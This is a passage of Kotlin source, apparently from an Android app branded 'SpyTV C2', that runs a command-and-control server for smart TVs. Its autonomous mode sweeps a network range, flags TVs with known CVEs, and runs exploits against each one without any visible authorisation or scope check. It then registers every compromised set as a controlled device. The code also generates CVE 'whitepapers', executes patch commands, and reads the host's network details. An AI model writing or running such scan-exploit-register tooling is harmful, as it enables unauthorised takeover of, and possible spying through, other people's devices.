        val results = JSONArray()
        var ok = 0
        for (template in commands) {
            val entry = executePatchCommand(template.replace("{ip}", ip))
            results.put(entry)
            if (entry.optString("status") in listOf("ok", "executed")) ok++
        }
        Log.i(TAG, "Patch $tvType on $ip: $ok/${commands.size} commands ok")
        return Triple("200 OK", "application/json", JSONObject().apply {
            put("ip", ip)
            put("tv_type", tvType)
            put("patches", results)
            put("ok", ok)
            put("total", commands.size)
            put("cves_fixed", JSONArray(TV_DATABASE[tvType]?.cves?.map { it.id } ?: emptyList<String>()))
        }.toString())
    }

    // ------------------------------------------------------------------
    // Autonomous mode — scan → verify → exploit → register, like
    // c2_ops.run_autonomous. Registered devices get their CVE inventory,
    // controls, Patch button and Whitepaper button in the dashboard.
    // ------------------------------------------------------------------

    private fun registerAutonomousDevice(
        ip: String,
        tvType: String,
        spec: FamilySpec,
        run: JSONObject
    ): String {
        val deviceId = ip.hashCode().toString().take(12)
        val now = Instant.now().toString()
        devices[deviceId] = JSONObject().apply {
            put("id", deviceId)
            put("ip", ip)
            put("family", spec.name)
            put("entry", "autonomous")
            put("status", "online")
            put("last_seen", now)
            put("registered_at", now)
            put("exploited_at", now)
            put("exploit", JSONObject().apply {
                put("tv_type", tvType)
                put("success", run.optBoolean("success"))
                put("duration_s", run.optDouble("duration_s", 0.0))
            })
            put("cves", JSONArray(spec.cves.map { c ->
                JSONObject().apply {
                    put("id", c.id)
                    put("severity", c.severity)
                    put("component", c.component)
                    put("fixed_in", c.fixedIn)
                }
            }))
        }
        return deviceId
    }

    private fun handleAutonomous(body: String): Triple<String, String, String> {
        val requested = try {
            JSONObject(body).optString("cidr", "").trim()
        } catch (e: Exception) {
            ""
        }
        val cidr = requested.ifBlank { defaultCidr() }
        val hosts = expandCidr(cidr)
        if (hosts.isEmpty()) return jsonError("400 Bad Request", "Invalid network range: $cidr")

        val scanned = JSONArray()
        val vulnerable = JSONArray()
        val exploited = JSONArray()
        val registered = JSONArray()
        val errors = JSONArray()

        Log.i(TAG, "Autonomous engagement on $cidr (${hosts.size} hosts)")
        val openByHost = probeMatrix(hosts, probePorts())
        var hostCount = 0
        for (ip in hosts) {
            val openPorts = openByHost[ip] ?: continue
            if (openPorts.isEmpty()) continue
            hostCount++
            val finding = buildFinding(ip, openPorts)
            scanned.put(finding)
            if (!finding.optBoolean("vulnerable")) continue

            val tvType = finding.getString("tv_type")
            val spec = TV_DATABASE[tvType] ?: continue
            val cveIds = spec.cves.map { it.id }
            vulnerable.put(JSONObject().apply {
                put("ip", ip)
                put("tv_type", tvType)
                put("cves", JSONArray(cveIds))
            })
            try {
                val run = executeExploit(tvType, ip)
                val record = JSONObject().apply {
                    put("ip", ip)
                    put("tv_type", tvType)
                    put("cves", JSONArray(cveIds))
                }
                exploited.put(record)
                if (run.optBoolean("success")) {
                    val deviceId = registerAutonomousDevice(ip, tvType, spec, run)
                    registered.put(JSONObject().apply {
                        put("ip", ip)
                        put("device_id", deviceId)
                        put("tv_type", tvType)
                        put("cves", JSONArray(cveIds))
                    })
                    Log.i(TAG, "Autonomous: registered $ip ($tvType) as $deviceId")
                }
            } catch (e: Exception) {
                errors.put("exploit $ip failed: ${e.message}")
            }
        }

        scans.add(JSONObject().apply {
            put("cidr", cidr)
            put("found", hostCount)
            put("source", "autonomous")
            put("at", Instant.now().toString())
        })

        return Triple("200 OK", "application/json", JSONObject().apply {
            put("status", "ok")
            put("scanned", hostCount)
            put("vulnerable", vulnerable)
            put("exploited", exploited)
            put("registered", registered)
            put("errors", errors)
        }.toString())
    }

    // ------------------------------------------------------------------
    // Whitepapers — real per-CVE documents built from the database.
    // ------------------------------------------------------------------

    private fun whitepaperMarkdown(cveId: String): String? {
        val hit = findCve(cveId) ?: return null
        val commands = PATCH_COMMANDS[hit.tvType] ?: emptyList()
        return buildString {
            appendLine("# ${hit.cve.id} — ${hit.cve.component} vulnerability in ${hit.spec.name}")
            appendLine()
            appendLine("## Summary")
            appendLine()
            appendLine("**${hit.cve.severity} severity (CVSS ${hit.cve.score})** affecting the " +
                "**${hit.cve.component}** component on ${hit.spec.name} (`${hit.tvType}`). " +
                "Fixed in **${hit.cve.fixedIn}**.")
            appendLine()
            appendLine("## Affected product")
            appendLine()
            appendLine("- Product: ${hit.spec.name}")
            appendLine("- Platform: `${hit.tvType}`")
            appendLine("- Component: ${hit.cve.component}")
            appendLine("- Severity: ${hit.cve.severity} (CVSS ${hit.cve.score})")
            appendLine("- Fixed version: ${hit.cve.fixedIn}")
            appendLine("- Signature ports: `${hit.spec.ports.joinToString(", ")}`")
            appendLine()
            appendLine("## Detection")
            appendLine()
            appendLine("The C2 identifies exposed ${hit.spec.name} instances through their " +
                "signature ports. A match marks the device as running ${hit.spec.name} software " +
                "with the ${hit.cve.component} component in the affected version range. The " +
                "Check button runs this verification read-only — no payloads are sent.")
            appendLine()
            appendLine("## Remediation")
            appendLine()
            if (commands.isEmpty()) {
                appendLine("No automated patch commands for this family; update to " +
                    "${hit.cve.fixedIn} from the device's settings.")
            } else {
                commands.forEach { appendLine("- ``${it.replace("{ip}", "<tv-ip>")}``") }
            }
            appendLine()
            appendLine("## Exploit module")
            appendLine()
            appendLine("- `data/exploits/cve_exploits.py#${hit.spec.module}` " +
                "(runs from the desktop C2; this device performs the same socket-level checks)")
            appendLine()
            appendLine("## References")
            appendLine()
            appendLine("- [NVD — ${hit.cve.id}](https://nvd.nist.gov/vuln/detail/${hit.cve.id})")
            appendLine()
            appendLine("---")
            appendLine("*Generated from the bundled SpyTV CVE database (standalone Android mode) — " +
                "AI-expanded narrative whitepapers are produced by the desktop C2.*")
        }
    }

    private fun escapeHtml(s: String): String = s
        .replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        .replace("\"", "&quot;")

    private fun inlineMd(s: String): String {
        var out = escapeHtml(s)
        out = Regex("""\[([^\]]+)\]\(([^)\s]+)\)""").replace(out) {
            """<a href="${it.groupValues[2]}" target="_blank" rel="noopener">${it.groupValues[1]}</a>"""
        }
        out = Regex("""\*\*([^*]+)\*\*""").replace(out) { "<b>${it.groupValues[1]}</b>" }
        out = Regex("""`([^`]+)`""").replace(out) { "<code>${it.groupValues[1]}</code>" }
        return out
    }

    /** Minimal Markdown → HTML (headers, lists, code, links, emphasis). */
    private fun mdToHtml(md: String): String = buildString {
        var inCode = false
        var inList = false
        fun closeList() {
            if (inList) {
                append("</ul>")
                inList = false
            }
        }
        for (raw in md.lines()) {
            val line = raw.trimEnd()
            when {
                line.startsWith("```") -> {
                    closeList()
                    append(if (inCode) "</code></pre>\n" else "<pre><code>")
                    inCode = !inCode
                    append("\n")
                }
                inCode -> append(escapeHtml(line) + "\n")
                line.startsWith("### ") -> { closeList(); append("<h3>${inlineMd(line.drop(4))}</h3>\n") }
                line.startsWith("## ") -> { closeList(); append("<h2>${inlineMd(line.drop(3))}</h2>\n") }
                line.startsWith("# ") -> { closeList(); append("<h1>${inlineMd(line.drop(2))}</h1>\n") }
                line.startsWith("- ") -> {
                    if (!inList) { append("<ul>"); inList = true }
                    append("<li>${inlineMd(line.drop(2))}</li>\n")
                }
                line == "---" -> { closeList(); append("<hr>\n") }
                line.isBlank() -> closeList()
                else -> { closeList(); append("<p>${inlineMd(line)}</p>\n") }
            }
        }
        closeList()
        if (inCode) append("</code></pre>")
    }

    private fun whitepaperPage(cveId: String, markdown: String): String = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>$cveId — SpyTV Whitepaper</title>
        <style>
          :root { color-scheme: dark; }
          body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                 background: #0B0E14; color: #E5E7EB; margin: 0; padding: 32px; line-height: 1.6; }
          .wrap { max-width: 820px; margin: 0 auto; }
          h1, h2, h3 { color: #F9FAFB; line-height: 1.25; }
          h1 { font-size: 24px; border-bottom: 1px solid #1F2937; padding-bottom: 10px; }
          h2 { font-size: 17px; margin-top: 28px; color: #5EEAD4; }
          a { color: #5EEAD4; }
          code, pre { font-family: ui-monospace, SFMono-Regular, Consolas, monospace; }
          code { background: #111827; padding: 2px 6px; border-radius: 4px; font-size: 13px; }
          pre { background: #111827; padding: 14px; border-radius: 8px; overflow-x: auto; }
          pre code { background: none; padding: 0; }
          li { margin: 4px 0; }
          hr { border: none; border-top: 1px solid #1F2937; margin: 28px 0; }
          .tag { display: inline-block; background: #064E3B; color: #A7F3D0; font-size: 11px;
                 padding: 3px 8px; border-radius: 999px; margin-bottom: 14px; }
          footer { margin-top: 32px; font-size: 12px; color: #6B7280; }
        </style>
        </head>
        <body><div class="wrap">
        <div class="tag">SpyTV C2 &middot; CVE Whitepaper &middot; standalone Android</div>
        ${mdToHtml(markdown)}
        <footer><a href="/">Back to dashboard</a></footer>
        </div></body>
        </html>
    """.trimIndent()

    /** Resolve a clip id to a file under clipsDir (traversal-safe). */
    private fun clipFileOrNull(clipId: String): File? {
        return try {
            val decoded = java.net.URLDecoder.decode(clipId, "UTF-8")
            if (decoded.contains("..")) return null
            val target = File(clipsDir, decoded)
            val canonicalRoot = clipsDir.canonicalFile
            if (!target.canonicalFile.path.startsWith(canonicalRoot.path + File.separator)) return null
            if (target.isFile) target else null
        } catch (e: Exception) {
            null
        }
    }

    private fun getLocalIp(): String {
        return try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            for (iface in interfaces) {
                if (!iface.isUp || iface.isLoopback) continue
                for (addr in iface.inetAddresses) {
                    if (addr.isSiteLocalAddress) {
                        return addr.hostAddress ?: continue
                    }
                }
            }
            "192.168.1.100"
        } catch (e: Exception) {
            "192.168.1.100"
        }
    }
    
    private fun getMacAddress(): String {
        return try {
            val wifiManager = MainActivity.instance?.applicationContext
                ?.getSystemService(android.content.Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
            val info = wifiManager?.connectionInfo
            info?.macAddress ?: "Unknown"
        } catch (e: Exception) {
            "Unknown"
        }
    }

    private fun intToIpString(ip: Int): String {
        return "${ip and 0xFF}.${(ip shr 8) and 0xFF}.${(ip shr 16) and 0xFF}.${(ip shr 24) and 0xFF}"
    }

    private fun getGatewayIp(): String {
        return try {
            val wifiManager = MainActivity.instance?.applicationContext
                ?.getSystemService(android.content.Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
            val dhcp = wifiManager?.dhcpInfo
            val gatewayInt = dhcp?.gateway ?: 0
            if (gatewayInt != 0) {
                intToIpString(gatewayInt)
            } else "—"
        } catch (e: Exception) {
            "—"
        }
    }

    private fun getSubnetMask(): String {
        return try {
            val wifiManager = MainActivity.instance?.applicationContext
                ?.getSystemService(android.content.Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
            val dhcp = wifiManager?.dhcpInfo
            val maskInt = dhcp?.netmask ?: 0
            if (maskInt != 0) {
                intToIpString(maskInt)
            } else "—"
        } catch (e: Exception) {
            "—"
        }
    }
    
    private fun loadDefaultCves(): List<JSONObject> = emptyList() // superseded by TV_DATABASE
    
    fun port(): Int = port
}